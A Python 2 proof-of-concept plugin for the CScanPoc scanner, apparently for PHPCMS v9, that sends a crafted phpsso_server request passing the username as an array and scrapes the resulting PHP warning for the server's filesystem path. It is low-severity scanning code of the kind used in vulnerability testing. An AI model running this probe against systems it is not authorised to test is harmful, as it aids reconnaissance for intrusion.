# coding: utf-8
import re
import urllib2

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'PHPCMS_0104'  # 平台漏洞编号，留空
    name = 'PHPCMS v9 /phpsso_server Infomation Disclosure'  # 漏洞名称
    level = VulnLevel.LOW  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = '2014-10-27'  # 漏洞公布时间
    desc = '''
        The functions in the global.func.php can not handle with array,so it raise an error.
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PHPCMS'  # 漏洞应用名称
    product_version = 'V9'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'a98f7250-e6be-4c89-bdae-9933fa3c161c'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def match_patter(self, content, pattern=r'Warning.*?((?:[a-z]:\\(?:[\\\w|\s|\-|\.|\x81-\xfe|\x40-\xfe]+?)global\.func\.php)|(?:/[^<>]+?global\.func\.php))'):
        match = re.findall(pattern, content, re.I | re.M)
        return match

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            verify_url = self.target + \
                "/phpsso_server/?m=phpsso&c=index&a=getuserinfo&appid=1&data%5busername%5d=ks"
            try:
                request = urllib2.Request(verify_url)
                response = urllib2.urlopen(request)
                content = response.read()
            except urllib2.HTTPError, e:
                content = e.read()

            match = self.match_patter(content)
            # Disclosure = match[0]
            if match:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
